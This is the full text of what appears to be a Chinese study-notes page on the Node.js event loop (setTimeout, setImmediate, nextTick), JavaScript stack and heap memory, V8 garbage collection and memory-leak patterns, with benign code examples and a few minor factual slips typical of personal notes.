文件I/O 、 网络I/O中   setImmediate会 先于 settimeout ;</li> <li>否则一般情况下 setTimeout  会先于 setImmediate;</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setImmediate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setImmediate'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// 这里可能会输出 setTimeout，setImmediate；可能也会相反的输出，这取决于性能</span>
<span class="token comment">// 因为可能进入 event loop 用了不到 4 毫秒，这时候会执行 setImmediate；否则会执行 setTimeout</span>

<span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>__filename<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setImmediate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'immediate'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//setImmediate，setTimeout</span>
<span class="token comment">// 因为 readFile 的回调在 poll 中执行，发现有 setImmediate ，所以会立即跳到 check 阶段执行回调</span>
<span class="token comment">// 再去 timer 阶段执行 setTimeout；所以以上输出一定是 setImmediate，setTimeout</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h5 id="setimmediate与process-nexttick"><a href="#setimmediate与process-nexttick" class="header-anchor">#</a> setImmediate与process.nextTick</h5> <p>process.nextTick和setImmediate的一个重要区别：<strong>多个process.nextTick语句总是在当前&quot;执行栈&quot;一次执行完，多个setImmediate可能则需要多次loop才能执行完</strong>。事实上，这正是Node.js 10.0版添加setImmediate方法的原因，否则像下面这样的递归调用process.nextTick，将会没完没了，主线程根本不会去读取&quot;事件队列&quot;！</p> <p><strong>由于process.nextTick指定的回调函数是在本次&quot;事件循环&quot;触发，而setImmediate指定的是在下次&quot;事件循环&quot;触发</strong>，所以很显然，前者总是比后者发生得早，而且执行效率也高（因为不用检查&quot;任务队列&quot;）。</p> <h5 id="案例-3"><a href="#案例-3" class="header-anchor">#</a> <strong>案例</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setImmediate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'--setImmediate--&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'--setTimeout--&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token comment">// 注意： 每次事件轮询后，在额外的I/O执行前，next tick队列都会优先执行。</span>
<span class="token comment">// 递归调用nextTick callbacks 会阻塞任何I/O操作，就像一个while(true); 循环一样。</span>
process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'--nextTick--&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'--nextTick.nextTick--&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'scheduled'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// start</span>
<span class="token comment">// scheduled</span>
<span class="token comment">// --nextTick--&gt;</span>
<span class="token comment">// --nextTick.nextTick--&gt;</span>
<span class="token comment">// --setTimeout--&gt;</span>
<span class="token comment">// --setImmediate--&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//加入两个nextTick()的回调函数</span>
process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'nextTick延迟执行1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'nextTick延迟执行2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">//加入两个setImmediate()的回调函数</span>
<span class="token function">setImmediate</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setImmediate延迟执行1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//进入下次循环</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;强势插入！！&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setImmediate</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;setImmediate延迟执行2&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;正常执行&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 正常执行</span>
<span class="token comment">// nextTick延迟执行1</span>
<span class="token comment">// nextTick延迟执行2</span>
<span class="token comment">// setImmediate延迟执行1</span>
<span class="token comment">// setImmediate延迟执行2</span>
<span class="token comment">// 强势插入！！</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><h3 id="优化"><a href="#优化" class="header-anchor">#</a> 优化</h3> <h4 id="_1-js内存机制【要点】"><a href="#_1-js内存机制【要点】" class="header-anchor">#</a> 1:JS内存机制【要点】</h4> <p>JavaScript 中的内存空间主要分为三种类型：</p> <ul><li>代码空间：主要用来存放可执行代码</li> <li>栈空间：调用栈的存储空间就是栈空间。</li> <li>堆空间</li></ul> <p>代码空间主要用来存放可执行代码的。栈空间及堆空间主要用来存放数据的。接下来我们主要介绍栈空间及堆空间。</p> <p>JavaScript 中的变量类型有 <code>8</code> 种，可分为两种：基本类型、引用类型</p> <p>基本类型：【SSBNNU BO】</p> <ul><li><code>symbol</code></li> <li><code>string</code></li> <li><code>boolean</code></li> <li><code>number</code></li> <li><code>null</code></li> <li><code>undefined</code></li> <li><code>bigint</code></li></ul> <p>引用类型：</p> <ul><li><code>object</code></li></ul> <p>其中，基本类型是保存在栈内存中的简单数据段，而引用类型保存在堆内存中。</p> <h5 id="栈空间"><a href="#栈空间" class="header-anchor">#</a> 栈空间</h5> <p>基本类型在内存中占有固定大小的空间，所以它们的值保存在栈空间，我们通过 <strong>按值访问</strong> 。</p> <p>一般栈空间不会很大。</p> <h5 id="堆空间"><a href="#堆空间" class="header-anchor">#</a> 堆空间</h5> <p>引用类型，值大小不固定，但指向值的指针大小（内存地址）是固定的，所以把对象放入堆中，将对象的地址放入栈中，这样，在调用栈中切换上下文时，只需要将指针下移到上个执行上下文的地址就可以了，同时保证了栈空间不会很大。</p> <p>当查询引用类型的变量时， 先从栈中读取内存地址， 然后再通过地址找到堆中的值。对于这种，我们把它叫做 <strong>按引用访问</strong> 。</p> <p>一般堆内存空间很大，能存放很多数据，但它内存分配与回收都需要花费一定的时间。</p> <p>举个例子帮助理解一下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token number">2</span>
  <span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'an'</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 函数调用</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>基本类型（栈空间）与引用类型（堆空间）的存储方式决定了：基本类型赋值是值赋值，而引用类型赋值是地址赋值。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 值赋值</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> a
a <span class="token operator">=</span> <span class="token number">2</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> 
<span class="token comment">// 1</span>
<span class="token comment">// b 不变</span>

<span class="token comment">// 地址赋值</span>
<span class="token keyword">var</span> a1 <span class="token operator">=</span> <span class="token punctuation">{</span>name<span class="token operator">:</span> <span class="token string">'an'</span><span class="token punctuation">}</span>
<span class="token keyword">var</span> b1 <span class="token operator">=</span> a1
a1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'bottle'</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span>
<span class="token comment">// {name: &quot;bottle&quot;}</span>
<span class="token comment">// b1 值改变</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p><img src="/rat-summ/assets/img/image-20211109191852184-6459512.086d10c6.png" alt="image-20211109191852184"></p> <p>接着垃圾回收案例；</p> <h5 id="回收栈空间"><a href="#回收栈空间" class="header-anchor">#</a> 回收栈空间</h5> <p>在 JavaScript 执行代码时，主线程上会存在 ESP【<strong>扩展栈指针寄存器</strong>】指针，用来指向调用栈中当前正在执行的上下文，如下图，当前正在执行 <code>foo</code> 函数：</p> <p><img src="/rat-summ/assets/img/image-20211109193406550-6459512.15c1113d.png" alt="image-20211109193406550"></p> <p>当 <code>foo</code> 函数执行完成后，ESP 向下指向全局执行上下文，此时需要销毁 <code>foo</code> 函数。</p> <p>怎么销毁？</p> <p>当 ESP 指针指向全局执行上下文，<code>foo</code> 函数执行上下文已经是无效的了，当有新的执行上下文进来时，可以直接覆盖这块内存空间。即：<strong>JavaScript 引擎通过向下移动 ESP 指针来销毁存放在栈空间中的执行上下文。</strong></p> <p><img src="/rat-summ/assets/img/image-20211109193447411-6459512.916fb53c.png" alt="image-20211109193447411"></p> <h5 id="回收堆空间【要点】"><a href="#回收堆空间【要点】" class="header-anchor">#</a> 回收堆空间【要点】</h5> <p>V8 中把堆分成新生代与老生代两个区域：</p> <ul><li>新生代：用来存放生存<strong>周期较短的小对象，一般只支持1～8M的容量</strong></li> <li>老生代：用来存放生存<strong>周期较长的对象或大对象</strong></li></ul> <p>V8 对这两块使用了不同的回收器：<strong>【新小副/老主大】</strong></p> <ul><li><strong>新生代使用副垃圾回收器</strong></li> <li><strong>老生代使用主垃圾回收器</strong></li></ul> <p>新生代通常只有<code>1-8M</code>的容量，而老生代的容量就大很多了。对于这两块区域，V8分别使用了<strong>不同的垃圾回收器和不同的回收算法</strong>，以便更高效地实施垃圾回收</p> <ul><li><code>副垃圾回收器 + Scavenge算法</code>：主要负责新生代的垃圾回收</li> <li><code>主垃圾回收器 + Mark-Sweep &amp;&amp; Mark-Compact算法</code>：主要负责老生代的垃圾回收</li></ul> <h6 id="回收执行流程"><a href="#回收执行流程" class="header-anchor">#</a> <strong>回收执行流程</strong></h6> <p>其实无论哪种垃圾回收器，都采用了同样的流程（三步走）：</p> <ul><li><strong>标记：</strong> 标记堆空间中的活动对象（正在使用）与非活动对象（可回收）</li> <li><strong>垃圾清理：</strong> 回收非活动对象所占用的内存空间</li> <li><strong>内存整理：</strong> 当进行频繁的垃圾回收时，内存中可能存在大量不连续的内存碎片，当需要分配一个需要占用较大连续内存空间的对象时，可能存在内存不足的现象，所以，这时就需要整理这些内存碎片。</li></ul> <p>副垃圾回收器与主垃圾回收器虽然都采用同样的流程，<strong>但使用的回收策略与算法是不同的</strong>。</p> <h6 id="副垃圾回收器"><a href="#副垃圾回收器" class="header-anchor">#</a> <strong>副垃圾回收器</strong></h6> <p>它采用 <strong>Scavenge 算法及对象晋升策略</strong>来进行垃圾回收</p> <p>所谓 Scavenge 算法，即把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域，如下图所示：</p> <p>新加入的对象都加入对象区域，当对象区满的时候，就执行一次垃圾回收，执行流程如下：</p> <ul><li>标记：首先要对区域内的对象进行标记（活动对象、非活动对象）</li> <li>垃圾清理：然后进行垃圾清理：将对象区的活动对象复制到空闲区域，并进行有序的排列，当复制完成后，对象区域与空闲区域进行翻转，空闲区域晋升为对象区域，对象区域为空闲区域</li></ul> <p>翻转后，对象区域是没有碎片的，此时不需要进行第三步（内存整理了）</p> <p><img src="/rat-summ/assets/img/image-20211109193927088.8ae98c4c.png" alt="image-20211109193927088"></p> <p>但，新生代区域很小的，一般1～8M的容量，所以它很容易满，<strong>所以，JavaScript 引擎采用对象晋升策略来处理，即只要对象经过两次垃圾回收之后依然继续存活，就会被晋升到老生代区域中。</strong></p> <h6 id="主垃圾回收器"><a href="#主垃圾回收器" class="header-anchor">#</a> <strong>主垃圾回收器</strong></h6> <p>老生代区域里除了存在从新生代晋升来的存活时间久的对象，当遇到大对象时，大对象也会直接分配到老生代。</p> <p><strong>所以主垃圾回收器主要保存存活久的或占用空间大的对象，此时采用 Scavenge 算法就不合适了。V8 中主垃圾回收器主要采用标记-清除法进行垃圾回收。</strong></p> <p>主要流程如下：</p> <ul><li>标记：遍历调用栈，看老生代区域堆中的对象是否被引用，被引用的对象标记为活动对象，没有被引用的对象（待清理）标记为垃圾数据。</li> <li>垃圾清理：将所有垃圾数据清理掉</li> <li>内存整理：标记-整理策略，将活动对象整理到一起</li></ul> <h6 id="增量标记"><a href="#增量标记" class="header-anchor">#</a> <strong>增量标记</strong></h6> <p>V8 浏览器会自动执行垃圾回收，但由于 JavaScript 也是运行在主线程上的，一旦执行垃圾回收，就要打断 JavaScript 的运行，可能会或多或少的造成页面的卡顿，影响用户体验，<strong>所以 V8 决定采用增量 标记算法回收</strong>：</p> <p>即把垃圾回收拆成一个个小任务，穿插在 JavaScript 中执行。</p> <h4 id="_2-垃圾回收"><a href="#_2-垃圾回收" class="header-anchor">#</a> 2:垃圾回收</h4> <p><strong>GC的缺陷</strong>：GC时，停止响应其他操作，这是为了安全考虑**， **这就是新引擎需要优化的点：<strong>避免GC造成的长时间停止响应</strong>。</p> <p>Javascript引擎基础GC方案是（simple GC）：mark and sweep（标记清除），即：</p> <ul><li>遍历所有可访问的对象。</li> <li>回收已不可访问的对象。</li></ul> <p><strong>常用的垃圾回收方式</strong></p> <ul><li>标记清除【最常用】；</li> <li>引用计数；</li></ul> <p><strong>GC优化策略</strong></p> <p>主要介绍了2个优化方案，而这也是最主要的2个优化方案：</p> <p><strong>（1）分代GC回收（Generation GC）</strong></p> <p><strong>这个和Java回收策略思想是一致的</strong>。也是V8所主要采用的。目的是<strong>通过区分“临时”与“持久”对象</strong>；多回收“临时对象”区（young generation），少回收“持久对象”区（tenured generation），减少每次需遍历的对象，从而减少每次GC的耗时</p> <p><strong>（2）增量GC</strong>
这个方案的思想很简单，就是“<strong>每次处理一点，下次再处理一点，如此类推</strong>”。</p> <p>这种方案，虽然耗时短，但中断较多，带来了上下文切换频繁的问题。</p> <p>总结：<strong>因为每种方案都其适用场景和缺点，因此在实际应用中，会根据实际情况选择方案。</strong></p> <p>比如：</p> <ul><li>低 (对象/s) 比率时，中断执行GC的频率，simple GC更低些；</li> <li>如果大量对象都是长期“存活”，则分代处理优势也不大;</li></ul> <h4 id="_3-内存泄漏"><a href="#_3-内存泄漏" class="header-anchor">#</a> 3:内存泄漏</h4> <p><strong>内存泄漏指任何对象在不再拥有或需要它之后仍然存在。</strong>
垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。</p> <ul><li><strong>意外的全局变量</strong>：无法被回收。</li> <li><strong>定时器</strong>：<strong>未被正确关闭</strong>，导致所引用的外部变量无法被释放。 setTimeout 的<strong>第一个参数使用字符串而非函数的话</strong>，会引发内存泄漏。</li> <li><strong>事件监听</strong>：没有正确销毁（低版本浏览器可能出现）。</li> <li><strong>闭包</strong>：会导致父级中的变量无法被释放。</li> <li><strong>DOM 引用</strong>：DOM 被删除时，<strong>内存中的引用未被正确清空</strong>。</li> <li>闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）</li></ul> <p>案例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//减少全局变量</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// a 未在外部声明过</span>
    a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token string">'Sunshine_Lin'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token comment">//上方代码等同于</span>
<span class="token keyword">var</span> a
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token string">'Sunshine_Lin'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token string">'Sunshine_Lin'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">//未清除定时器</span>
<span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token string">'Sunshine_Lin'</span><span class="token punctuation">)</span>
  <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span>  <span class="token function">clearInterval</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span>
    <span class="token keyword">let</span> a <span class="token operator">=</span> arr
    i<span class="token operator">++</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">//合理使用闭包</span>
<span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token string">'Sunshine_Lin'</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> arr
<span class="token punctuation">}</span>
<span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    a<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">//分离DOM</span>
<span class="token comment">//&lt;button id=&quot;btn&quot;&gt;点击&lt;/button&gt;</span>
<span class="token keyword">let</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn'</span><span class="token punctuation">)</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>btn<span class="token punctuation">)</span>
btn <span class="token operator">=</span> <span class="token keyword">null</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><h4 id="_4-vue内存泄漏问题"><a href="#_4-vue内存泄漏问题" class="header-anchor">#</a> 4:Vue内存泄漏问题</h4> <p>JS 程序的内存溢出后，会使某一段函数体永远失效（取决于当时的 JS 代码运行到哪一个函数），通常表现为程序突然卡死或程序出现异常。</p> <p>这时我们就要对该 JS 程序进行内存泄漏的排查，找出哪些对象所占用的内存没有释放。这些对象通常都是开发者以为释放掉了，但事实上仍被某个闭包引用着，或者放在某个数组里面。</p> <h5 id="泄漏点"><a href="#泄漏点" class="header-anchor">#</a> 泄漏点</h5> <ol><li>DOM/BOM 对象泄漏；</li> <li>script 中存在对 DOM/BOM 